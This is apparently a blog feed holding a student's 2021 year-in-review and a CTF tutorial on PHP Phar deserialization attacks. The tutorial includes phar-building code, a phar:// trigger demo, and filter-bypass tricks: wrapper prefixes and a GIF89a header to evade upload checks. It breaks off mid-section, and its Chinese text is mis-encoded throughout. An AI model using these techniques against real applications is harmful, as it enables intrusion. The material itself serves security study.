å„ç§ä¸œè¥¿ï¼Œä»¥å‰æ²¡æœ‰ç²¾åŠ›ã€æ²¡æœ‰æ¡ä»¶çš„å¾ˆå¤šäº‹æƒ…ç»ˆäºèƒ½åœ¨è¿™ä¸ªå‡æœŸæ”¾è‚†åœ°ç©ä¸€æŠŠäº†ã€‚é™¤æ­¤ä»¥å¤–å°±æ˜¯å’Œæœºæˆ¿çš„å„ä½åˆ°å¤„åƒåƒåƒï¼ŒçŒ«å’–ä»€ä¹ˆçš„éƒ½èµ°èµ·ã€‚è‡ªå·±ç»„äº†å°æœºå­ï¼Œå­¦å­¦ç„Šæ¿å­ï¼Œç©ç©Arduinoã€‚ç„¶åå¾ˆçªç„¶åœ°å°±å¾—çŸ¥è‡ªå·±è¢«ZJUå½•å–äº†ï¼ˆå‡ ä¹å‹çº¿ï¼‰ï¼Œä¹‹å‰åªæƒ³ç€ä¸æ˜¯SJTUå°±æ˜¯NJUä»æ²¡æƒ³è¿‡æ˜¯è¿™ä¸ªç»“æœï¼ˆç¬‘ï¼Œç°åœ¨çœ‹æ¥æ˜¯æœ€å¥½çš„é€‰æ‹©ï¼Œæ¯•ç«Ÿæ²¡æœ‰hnxé‚£æ ·çš„å‹¤å¥‹ï¼Œæ”¶è·Ã·åŠªåŠ›çš„æ€§ä»·æ¯”å·²ç»å¾ˆé«˜äº†ï¼‰ã€‚æ—¶é—´è¿‡å¾—å¤ªå¿«ï¼Œè½¬çœ¼å°±è¦å¼€å­¦äº†äº†ï¼Œæˆ‘æ ¹æœ¬æ²¡åšå¥½æˆä¸ºå¤§å­¦ç”Ÿçš„å‡†å¤‡ï¼è¿˜æ²¡ä»å¯¹æœ€é•¿æš‘å‡çš„æ€€å¿µä¸­èµ°å‡ºï¼Œæè”—å°±ç»™æ•´äº†ä¸€å †å¹ºè›¾å­å‡ºæ¥ï¼Œå»¶è¿Ÿåˆ°æ ¡ä¸è¯´ï¼Œç»ˆäºæŠµè¾¾ååœ¨æ ¡çš„ç¬¬ä¸€å¤©è¿˜è¢«è¸¢çš®çƒï¼Œä»æ—©åˆ°æ™šç¡¬æ˜¯èµ°äº†å‡ ä¸‡æ­¥ã€‚åªèƒ½è¯´ï¼Œç¬¬ä¸€å°è±¡å¾ˆé‡è¦â€¦â€¦ï¼ˆç—›è‹¦çš„ï¼‰å†›è®­ç»“æŸåï¼Œå¤§å­¦ç”Ÿæ´»ç®—æ˜¯æ­£å¼å¼€å§‹äº†ã€‚è¿™ååŠå¹´æ€»ä½“æˆ‘è¿˜æ˜¯å¾ˆå¼€å¿ƒçš„ã€‚<br>é¦–å…ˆæˆ‘çš„èˆå‹ä»¬åŸºæœ¬éƒ½ç¡å¾—å¾ˆæ™šï¼Œå®Œç¾å¥‘åˆæœ¬äººçŒ«å¤´é¹°æ´¾ä½œæ¯ï¼šâ€œç¿è‹¥æ˜Ÿè¾°çš„æµ™å¤§äººâ€å½“ç„¶åº”è¯¥åœ¨æ˜Ÿç©ºä¸‹å¹²æ´»ï¼Œç™½å¤©ç•™ç»™æš–æ´‹æ´‹çš„ç¡çœ æ‰æ˜¯æ­£é“ï¼Œæ—©å…«ä¹ƒé‚ªæ¶ä¹‹ç‰©ã€‚èˆå‹éƒ½å¾ˆæ­£å¸¸ï¼Œè¿˜å¯ä»¥ä¸€èµ·è”æœºæ¸¸æˆï¼Œå­¦ä¸šä¸Šä¹Ÿæœ‰è‰¯æ€§äº’åŠ¨ã€‚æˆ‘å‡ ä¸ªæœˆåæ‰æ„Ÿå—åˆ°è¿™æ˜¯å¤šä¹ˆå®è´µå’Œå¹¸è¿â€”â€”å’Œéƒ¨åˆ†é«˜ä¸­åŒå­¦çš„åœ¨å¤§å­¦ä½å®¿çš„æ‚²æƒ¨ç»å†å¯¹æ¯”è€Œè¨€ï¼ˆå¸Œæœ›äººæ²¡äº‹ï¼‰ã€‚è¯´åˆ°å¹¸è¿ï¼Œæˆ‘è§‰å¾—æœ€å¹¸è¿çš„æ˜¯åŠ å…¥äº†AAAï¼Œè®¤è¯†äº†å„ä½å¸ˆå‚…ã€‚å…¶å®æˆ‘æ˜¯æš‘å‡å¼€å§‹æ‰“äº†æˆç”µçš„æ‹›æ–°èµ›ï¼Œæ„ˆå‘è§‰å¾—CTFæœ‰æ„æ€ã€‚æ¥äº†å¤§å­¦ååœ¨æ¥¼ä¸‹çœ‹è§æ‹›æ–°æ¨ªå¹…ä¸€ä¸‹å°±è¢«å¸å¼•äº†ã€‚åæ¥çš„æŸä¸€å‘¨æˆ‘å‡ ä¹æ•´å¤©æ²‰è¿·æ‰“ä¸­ç§‘å¤§çš„hackergameï¼Œç¡®å®è¿‡äºä¸Šå¤´äº†ã€‚å€Ÿæ­¤è®¤è¯†äº†æŸçŸ¥è¯†é¢†åŸŸä¼˜ç§€upä¸»å’ŒæŸå¯†ç å­¦å¤§å¸ˆï¼Œè®¤è¯†äº†é˜Ÿé‡Œçš„å­¦é•¿ä»¬ï¼Œç„¶åå°±è¿›å»äº†ã€‚æ„Ÿè§‰å°±â€¦â€¦å¾ˆçªç„¶ï¼Œæˆ‘çœŸå¿ƒè§‰å¾—è‡ªå·±è¿˜æ˜¯å¤ªèœäº†ï¼Œå¯æ˜¯ä¾ç„¶è·Ÿç€é˜Ÿé‡Œçš„å¤§ä½¬ä»¬è¹­é¥­åŒ–å­¦æ³¡æ¸©æ³‰â€¦â€¦è¿˜æ˜¯è¦æé«˜è‡ªå·±å§¿åŠ¿æ°´å¹³ï¼Œä¸è¾œè´Ÿæ— è®ºæ˜¯å®¶é•¿è¿˜æ˜¯è€å¸ˆè¿˜æ˜¯é˜Ÿé‡Œå„ä½çš„æœŸå¾…æ‰æ˜¯æœ€ä½³çš„å›æŠ¥æ–¹æ³•ã€‚  </p><blockquote><p>There should be oneâ€“ and preferably only one â€“obvious way to do it.<br>â€”â€”Tim Peters, The Zen of Python</p></blockquote><p>æ„Ÿè°¢è´µæ ¡çš„åˆ†æµåˆ¶åº¦ï¼Œæˆ‘å»äº†CSä¸“ä¸šï¼ŒæŒ‰ç…§é«˜è€ƒæˆç»©æ¥è¯´è¿™å®åœ¨æ˜¯åè¶³çš„æ¡æ¼äº†ã€‚è™½ç„¶å¤§å®¶éƒ½æœ‰å…‰æ˜çš„æœªæ¥ï¼Œå­¦æ•°å­¦çš„å°†æ¥æŒ‡ä¸å®šå°±å’Œå­¦å•†ç§‘çš„åŒå­¦å¼ºå¼ºè”åˆï¼Œquantä»¬æ¨ªæ‰«ä¸šç•Œèµ°ä¸Šäººç”Ÿå·…å³°ï¼›ä¸è¿‡æˆ‘ç¡®å®å–œæ¬¢ç€codingä¹‹ç±»çš„ï¼Œå½“ä¸ªè‡­å†™ä»£ç çš„ä¹Ÿä¸æ˜¯ä¸å¯ä»¥å˜›ã€‚æ€»ä¹‹å–œæ¬¢å°±å¥½äº†ï¼ŒçŸ¥è¶³å¸¸ä¹.jpg<br>è¿™å­¦æœŸç»“æŸçš„ç»©ç‚¹â€¦â€¦å—¯â€¦â€¦å·®å¼ºäººæ„å§ï¼Œå¸Œæœ›ä¹‹åèƒ½å¤Ÿç”¨ä¸“ä¸šè¯¾æ‹‰ä¸€æ‹‰ã€‚<br>ç„¶åä¸å¾—ä¸æçš„å°±æ˜¯æ‹‰æ‹‰ç¾¤ï¼Œåœ¨ç¾¤é‡Œç¼ºå¾·çœŸæ˜¯å¤ªæœ‰æ„æ€äº†ï¼Œäººæ‰è¾ˆå‡ºï¼Œè§£ç­”å„ç§ç–‘é—®çš„åŒæ—¶è¿˜èƒ½ç»™äºˆæˆ‘åè¶³çš„peer pressureï¼Œå®åœ¨æ˜¯ååˆ†æ„Ÿè°¢äº†&#x3D;_&#x3D;<br>æ­¤å¤–åŠ å…¥Fç¤¾ä¹Ÿå¾ˆå…´å¥‹ï¼&#x2F;&#x2F;è™½ç„¶ç¤¾å›¢è¯¾æ‘¸äº†<br>æˆ‘çš„2021å¤§æ¦‚å°±æ˜¯è¿™æ ·ï¼Œæ²¡æœ‰å¾ˆç‰¹åˆ«çš„ï¼Œä½†æ˜¯çœŸçš„æŒºå¹¸è¿çš„ã€‚éš¾é“è¯´åœ¨å¤§å¤šæ•°æ—¶å€™ç”¨â€œæ²¡æœ‰ä»€ä¹ˆå¤§ä¸äº†â€çš„å¿ƒæ€å»é¢å¯¹é‚£äº›çƒ¦äººçš„äº‹æƒ…ï¼Œå°±ä¼šæ›´å¹¸è¿ï¼Ÿ<br>é‚£ä¹ˆ2022å‘¢ï¼Ÿæˆ‘è®¸å‡ ä¸ªå°å°çš„æ„¿æœ›ã€‚<br>æˆ‘å¸Œæœ›æˆ‘èƒ½æŠŠå°æç´æ¡èµ·æ¥ï¼Œå…‘ç°ä»¥å‰æ”¾å¼ƒå­¦ä¹ æ—¶çš„æ‰¿è¯ºï¼ˆç¬‘ï¼‰ï¼›<br>ç„¶åå°±æ˜¯å¥½å¥½å­¦web&#x2F;miscæ–¹å‘ï¼Œç»™é˜Ÿé‡Œåšå‡ºæ›´å¤§è´¡çŒ®ï¼›<br>æˆ‘å¸Œæœ›2022æˆ‘å¯ä»¥å¯¹æœªæ¥çœ‹å¾—æ›´æ¸…ï¼Œå¯¹æ¥ä¸‹æ¥çš„é“è·¯æ‹Ÿå®šæ–¹å‘ï¼›<br>æ–°çš„ä¸€å¹´ä¸è¦å†æ‘†çƒ‚ï¼Œè®¤çœŸå¯¹å¾…ä¸“ä¸šè¯¾ï¼›<br>æœ€åï¼Œæˆ‘å¸Œæœ›å¤§å®¶èº«ä½“å¥åº·ï¼Œå¸Œæœ›æ‰€æœ‰äººå¥½å¥½æ´»ä¸‹å»ï¼Œæœ‰å¿ƒç†å¥åº·ä¸Šçš„é—®é¢˜èƒ½å¤Ÿç§¯æå¯»æ±‚å¸®åŠ©ã€‚<br>æ–°å¹´å¿«ä¹ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> éšç¬” </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æµ…è°ˆPharååºåˆ—åŒ–æ¼æ´åˆ©ç”¨ï¼šN1CTF 2021 easyphp &amp; å®‰æ´µæ¯2021 EZ_TP</title>
      <link href="/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&amp;%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/"/>
      <url>/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&amp;%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/</url>
      
        <content type="html"><![CDATA[<h1 id="Phar"><a href="#Phar" class="headerlink" title="Phar"></a>Phar</h1><h2 id="ä»€ä¹ˆæ˜¯Phar"><a href="#ä»€ä¹ˆæ˜¯Phar" class="headerlink" title="ä»€ä¹ˆæ˜¯Phar"></a>ä»€ä¹ˆæ˜¯Phar</h2><blockquote><p>PHp ARchive, like a Java JAR, but for PHP.</p></blockquote><p>pharï¼ˆPHp ARchiveï¼‰æ˜¯ç±»ä¼¼äºJARçš„ä¸€ç§æ‰“åŒ…æ–‡ä»¶ã€‚PHP â‰¥5.3å¯¹Pharåç¼€æ–‡ä»¶æ˜¯é»˜è®¤å¼€å¯æ”¯æŒçš„ï¼Œä¸éœ€è¦ä»»ä½•å…¶ä»–çš„å®‰è£…å°±å¯ä»¥ä½¿ç”¨å®ƒã€‚</p><blockquote><p>pharæ‰©å±•æä¾›äº†ä¸€ç§å°†æ•´ä¸ªPHPåº”ç”¨ç¨‹åºæ”¾å…¥.pharæ–‡ä»¶ä¸­çš„æ–¹æ³•ï¼Œä»¥æ–¹ä¾¿ç§»åŠ¨ã€å®‰è£…ã€‚.pharæ–‡ä»¶çš„æœ€å¤§ç‰¹ç‚¹æ˜¯å°†å‡ ä¸ªæ–‡ä»¶ç»„åˆæˆä¸€ä¸ªæ–‡ä»¶çš„ä¾¿æ·æ–¹å¼ï¼Œ.pharæ–‡ä»¶æä¾›äº†ä¸€ç§å°†å®Œæ•´çš„PHPç¨‹åºåˆ†å¸ƒåœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­å¹¶ä»è¯¥æ–‡ä»¶ä¸­è¿è¡Œçš„æ–¹æ³•ã€‚</p></blockquote><p>è¯´ç™½äº†ï¼Œå°±æ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œä½†æ˜¯ä¸æ­¢èƒ½æ”¾å‹ç¼©æ–‡ä»¶è¿›å»ã€‚</p><p>åœ¨åšè¿›ä¸€æ­¥æ¢ç©¶ä¹‹å‰éœ€è¦å…ˆè°ƒæ•´é…ç½®ï¼Œå› ä¸ºå¯¹äºPharæ–‡ä»¶çš„ç›¸å…³æ“ä½œï¼Œphpç¼ºçœçŠ¶æ€æ˜¯åªè¯»çš„ï¼ˆä¹Ÿå°±æ˜¯è¯´å•çº¯ä½¿ç”¨Pharæ–‡ä»¶ä¸éœ€è¦ä»»ä½•çš„è°ƒæ•´é…ç½®ï¼‰ã€‚ä½†æ˜¯å› ä¸ºæˆ‘ä»¬ç°åœ¨éœ€è¦åˆ›å»ºä¸€ä¸ªè‡ªå·±çš„Pharæ–‡ä»¶ï¼Œæ‰€ä»¥éœ€è¦å…è®¸å†™å…¥Pharæ–‡ä»¶ï¼Œè¿™éœ€è¦ä¿®æ”¹ä¸€ä¸‹Â <code>php.ini</code></p><p>æ‰“å¼€Â <code>php.ini</code>ï¼Œæ‰¾åˆ°Â <code>phar.readonly</code>Â æŒ‡ä»¤è¡Œï¼Œä¿®æ”¹æˆï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phar.readonly = 0</span><br></pre></td></tr></table></figure><p>å³å¯ã€‚</p><hr><h2 id="Pharæ–‡ä»¶æ ¼å¼"><a href="#Pharæ–‡ä»¶æ ¼å¼" class="headerlink" title="Pharæ–‡ä»¶æ ¼å¼"></a>Pharæ–‡ä»¶æ ¼å¼</h2><p>Pharæ–‡ä»¶ç”±å››éƒ¨åˆ†ç»„æˆï¼š</p><p><strong>1.stub</strong></p><p>stubæ˜¯pharæ–‡ä»¶çš„æ–‡ä»¶å¤´ï¼Œæ ¼å¼ä¸º<code>xxxxxx&lt;?php ...;__HALT_COMPILER();?&gt;</code>ï¼Œxxxxxxå¯ä»¥æ˜¯ä»»æ„å­—ç¬¦ï¼ŒåŒ…æ‹¬ç•™ç©ºï¼Œä¸”phpé—­åˆç¬¦ä¸æœ€åä¸€ä¸ªåˆ†å·ä¹‹é—´ä¸èƒ½æœ‰å¤šäºä¸€ä¸ªçš„ç©ºæ ¼ç¬¦ã€‚å¦å¤–phpé—­åˆç¬¦ä¹Ÿå¯çœç•¥ã€‚</p><p><strong>2.manifest describing the contents</strong></p><p>è¯¥åŒºåŸŸå­˜æ”¾pharåŒ…çš„å±æ€§ä¿¡æ¯ï¼Œå…è®¸æ¯ä¸ªæ–‡ä»¶æŒ‡å®šæ–‡ä»¶å‹ç¼©ã€æ–‡ä»¶æƒé™ï¼Œç”šè‡³æ˜¯ç”¨æˆ·å®šä¹‰çš„å…ƒæ•°æ®ï¼Œå¦‚æ–‡ä»¶ç”¨æˆ·æˆ–ç»„ã€‚</p><p><img src="https://img2020.cnblogs.com/blog/1335480/202111/1335480-20211128132951141-67782555.png"></p><p>è¿™é‡Œé¢çš„metadataä»¥serializeå½¢å¼å‚¨å­˜ï¼Œä¸ºååºåˆ—åŒ–æ¼æ´åŸ‹ä¸‹äº†ä¼ç¬”ã€‚</p><p><strong>3.file contents</strong></p><p>è¢«å‹ç¼©çš„ç”¨æˆ·æ·»åŠ çš„æ–‡ä»¶å†…å®¹</p><p>4.<strong>signature</strong></p><p>å¯é€‰ï¼Œpharæ–‡ä»¶çš„ç­¾åï¼Œå…è®¸çš„æœ‰MD5, SHA1, SHA256, SHA512å’ŒOPENSSL.</p><p><img src="https://img2020.cnblogs.com/blog/1335480/202111/1335480-20211128132825512-1951331537.png"></p><p>è¿™éƒ¨åˆ†ä»¥<code>GBMB</code>ï¼ˆ47 42 4d 42ï¼‰ç»“å°¾ã€‚</p><p>éœ€è¦æ³¨æ„ï¼Œstubä¸ä¸€å®šè¦åœ¨æ–‡ä»¶å¼€å¤´ã€‚</p><h2 id="åˆ©ç”¨æ–¹å¼"><a href="#åˆ©ç”¨æ–¹å¼" class="headerlink" title="åˆ©ç”¨æ–¹å¼"></a>åˆ©ç”¨æ–¹å¼</h2><p>åœ¨2018 Black Hatä¸Šï¼Œå®‰å…¨ç ”ç©¶å‘˜<code>Sam Thomas</code>åˆ†äº«äº†è®®é¢˜<code>Itâ€™s a PHP unserialization vulnerability Jim, but not as we know it</code> .</p><p><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf">https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf</a></p><blockquote><p>åˆ©ç”¨pharæ–‡ä»¶ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„<strong>meta-data</strong>è¿™ä¸€ç‰¹æ€§ï¼Œæ‹“å±•äº†phpååºåˆ—åŒ–æ¼æ´çš„æ”»å‡»é¢ã€‚è¯¥æ–¹æ³•åœ¨<strong>æ–‡ä»¶ç³»ç»Ÿå‡½æ•°</strong>ï¼ˆfile_exists()ã€is_dir()ç­‰ï¼‰å‚æ•°å¯æ§çš„æƒ…å†µä¸‹ï¼Œé…åˆ<strong>phar:&#x2F;&#x2F;ä¼ªåè®®</strong>ï¼Œ<strong>å¯ä»¥ä¸ä¾èµ–unserialize()ç›´æ¥è¿›è¡Œååºåˆ—åŒ–æ“ä½œ</strong>ã€‚</p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶ä¼ å…¥ä»¥ä¸‹å‡½æ•°çš„å‚æ•°ï¼Œå°±æœ‰æ½œåœ¨çš„pharååºåˆ—åŒ–æ¼æ´åˆ©ç”¨å¯èƒ½ï¼š</p><p><img src="https://img2020.cnblogs.com/blog/1335480/202111/1335480-20211128132837264-437243908.png"></p><p>è¿˜æœ‰ä¸€äº›åˆ«çš„å‡½æ•°å¯ç”¨ï¼Œå¯å‚è€ƒè¿™ç¯‡ï¼š<a href="https://www.freebuf.com/articles/web/205943.html">https://www.freebuf.com/articles/web/205943.html</a></p><p><strong>è¯•è¯•çœ‹ï¼Ÿ</strong></p><p>æˆ‘ä»¬å…ˆæ¥ç”Ÿæˆä¸€ä¸ªpharï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//è®¾ç½®stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">    <span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„è¿™è¾¹$oååºåˆ—åŒ–åªä¼šä¿å­˜æ•°æ®ä¸ä¼šä¿å­˜æ–¹æ³•ã€‚æ‰§è¡Œå®Œæ¯•åï¼Œæˆ‘ä»¬æ¥è§‚å¯Ÿpharæ–‡ä»¶çš„å†…å®¹ï¼š</p><p><img src="https://img2020.cnblogs.com/blog/1335480/202111/1335480-20211128132846078-625393813.png"></p><p>GBMBç»“å°¾çš„ç­¾åä»¥åŠåºåˆ—åŒ–åçš„metadataæ¸…æ™°å¯è§ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Destruct called&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&#x27;phar://phar.phar/test.txt&#x27;</span>;<span class="comment">//æ—¢ç„¶æ˜¯å‹ç¼©æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥å¦‚æ­¤è®¿é—®å…¶ä¸­çš„æŸä¸ªæ–‡ä»¶</span></span><br><span class="line">    <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šé¢çš„ç¨‹åºæ‰§è¡Œä¹‹åï¼Œæˆ‘ä»¬ä¼šå‘ç°å®ƒè¾“å‡ºäº†â€œDestruct calledâ€.è¿™æ˜¯ç”±äºpharè¢«è§£æçš„æ—¶å€™ï¼Œmetadataè¢«ååºåˆ—åŒ–äº†ï¼Œäºæ˜¯è¯¥å®ä¾‹è¢«ææ„æ—¶è°ƒç”¨__destructå‡½æ•°ã€‚è¿™ä¾¿æ˜¯ååºåˆ—åŒ–æ¼æ´çš„æ¥ç”±ã€‚</p><p>PHP â‰¥5.3é»˜è®¤æ”¯æŒpharæ–‡ä»¶ï¼›è€Œåœ¨PHP8ä¸­ï¼Œè¯¥æ¼æ´è¢«ä¿®å¤ï¼šmetadataä¸ä¼šè‡ªåŠ¨è¢«ååºåˆ—åŒ–äº†ã€‚ï¼ˆæ¥æºè¯·æ±‚ï¼‰</p><hr><h2 id="phar-x2F-x2F-æ˜¯ä»€ä¹ˆ"><a href="#phar-x2F-x2F-æ˜¯ä»€ä¹ˆ" class="headerlink" title="phar:&#x2F;&#x2F;æ˜¯ä»€ä¹ˆ"></a><strong>phar:&#x2F;&#x2F;æ˜¯ä»€ä¹ˆ</strong></h2><p>å‰é¢æåˆ°ï¼Œæˆ‘ä»¬è§£æpharæ–‡ä»¶å¸¸å¸¸ä½¿ç”¨phar:&#x2F;&#x2F;ä¼ªåè®®ã€‚CTFä¸­ï¼Œç”±äºä¼ªåè®®æä¾›äº†ä¸€ç³»åˆ—å¯¹äºæ–‡ä»¶çš„å°è£…åè®®ï¼Œä½¿å¾—å½“æºç¨‹åºæœ‰å¯æ§çš„æ–‡ä»¶åŒ…å«å‡½æ•°æ—¶ï¼Œæˆ‘ä»¬æœ‰æœºä¼šåˆ©ç”¨è¿™äº›åè®®æ§åˆ¶å…¶è¿”å›å€¼æˆ–æ˜¯å®Œæˆä¸€äº›é¢„æ–™å¤–æ“ä½œï¼ˆä¾‹å¦‚ååºåˆ—åŒ–ï¼‰ã€‚ä½œä¸ºä¼ªåè®®çš„ä¸€ç§ï¼Œç”±äºpharæœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å‹ç¼©æ–‡ä»¶ï¼Œæ‰€ä»¥phar:&#x2F;&#x2F;å’Œzip:&#x2F;&#x2F;å…¶å®æœ‰å¾ˆå¤šç›¸ä¼¼ä¹‹å¤„ï¼Œéƒ½å¯ä»¥è®¿é—®å‹ç¼©åŒ…ä¸­çš„å­æ–‡ä»¶ï¼Œå¹¶ä¸”zip:&#x2F;&#x2F;éœ€è¦æ–‡ä»¶ç»å¯¹è·¯å¾„ï¼Œphar:&#x2F;&#x2F;å¹¶ä¸éœ€è¦ã€‚ï¼ˆæ¥æºè¯·æ±‚ï¼‰</p><hr><h2 id="å°tricks"><a href="#å°tricks" class="headerlink" title="å°tricks"></a><strong>å°tricks</strong></h2><h3 id="ç»•è¿‡å‰ç¼€è¿‡æ»¤"><a href="#ç»•è¿‡å‰ç¼€è¿‡æ»¤" class="headerlink" title="ç»•è¿‡å‰ç¼€è¿‡æ»¤"></a>ç»•è¿‡å‰ç¼€è¿‡æ»¤</h3><p>é˜Ÿé‡Œå¸ˆå‚…çš„å‡ ä¸ªexampleå¯ä»¥ç±»æ¯”ä½¿ç”¨ï¼Œéƒ½æ˜¯åœ¨å‰ç¼€éphar:&#x2F;&#x2F;çš„æƒ…å†µä¸‹è°ƒç”¨äº†phar:&#x2F;&#x2F;</p><p>compress.bzip2å’Œcompress.zlib</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$z</span> = <span class="string">&#x27;compress.bzip2://phar:///home/sx/test.phar/test.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$z</span> = <span class="string">&#x27;compress.zlib://phar:///home/sx/test.phar/test.txt&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$z</span>);</span><br></pre></td></tr></table></figure><p>php:&#x2F;&#x2F; </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=phar://phar.phar&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=phar://phar.phar&#x27;</span>);</span><br></pre></td></tr></table></figure><hr><h3 id="ç®€å•çš„ç»•è¿‡"><a href="#ç®€å•çš„ç»•è¿‡" class="headerlink" title="ç®€å•çš„ç»•è¿‡"></a>ç®€å•çš„ç»•è¿‡</h3><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨stubéƒ¨åˆ†å‰ç¼€ä»»æ„çš„ç‰¹æ€§ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);   <span class="comment">//è®¾ç½® stubï¼Œå¢åŠ  gif æ–‡ä»¶å¤´</span></span><br></pre></td></tr></table></figure><p>è¿™å¯ä»¥ç»•è¿‡ä¸€éƒ¨åˆ†å¯¹æ–‡ä»¶å¤´çš„æ£€æµ‹ã€‚</p><hr><h3 id="ç»•è¿‡å‰åè„æ•°æ®"><a href="#ç»•è¿‡å‰åè„æ•°æ®" class="headerlink" title="ç»•è¿‡å‰åè„æ•°æ®"></a>ç»•è¿‡å‰åè„æ•°æ®</h3><p>ç”±äºç­¾åéƒ¨åˆ†çš„å­˜åœ¨ï¼Œphpä¼šæ ¡éªŒæ–‡ä»¶å“ˆå¸Œå€¼ï¼Œå¹¶æ£€æŸ¥æœ«å°¾æ˜¯å¦ä¸ºGBMBï¼Œå¦‚ä¸‹æ˜¯è§£æéƒ¨åˆ†çš„æºç ï¼š</p><p><img src="https://img2020.cnblogs.com/blog/1335480/202111/1335480-20211128132857316-1778918757.png"></p><p><a 